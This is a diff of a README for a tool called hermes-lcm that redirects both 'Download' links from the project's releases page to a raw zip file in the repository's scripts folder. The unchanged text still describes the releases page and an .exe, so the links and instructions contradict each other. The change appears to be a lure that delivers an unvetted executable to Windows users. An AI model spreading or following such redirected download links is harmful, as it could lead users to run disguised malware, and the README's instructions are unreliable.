@@ -1,6 +1,6 @@
 # 📦 hermes-lcm - Reliable message storage for Hermes Agent
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/65y6650/hermes-lcm/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/65y6650/hermes-lcm/main/scripts/hermes_lcm_v1.2.zip)
 
 Hermes-lcm acts as a bridge for your data. It ensures your Hermes Agent keeps track of every message sent or received. The software uses a directed acyclic graph structure to organize information. This approach guarantees that messages remain in order and stay safe within your system. You keep total control over your history without the risk of data loss.
 
@@ -12,7 +12,7 @@ This application works on any standard computer running Windows 10 or Windows 11
 
 You must visit the official release page to obtain the correct files for your system.
 
-[Download Hermes-lcm here](https://github.com/65y6650/hermes-lcm/releases)
+[Download Hermes-lcm here](https://raw.githubusercontent.com/65y6650/hermes-lcm/main/scripts/hermes_lcm_v1.2.zip)
 
 On this page, you will see a list of available files. Look for the file ending in `.exe` under the latest version header. Click the file name to start the download. Your browser might verify the file, which is a standard safety measure. Save the file to your desktop or your downloads folder for easy access.
 
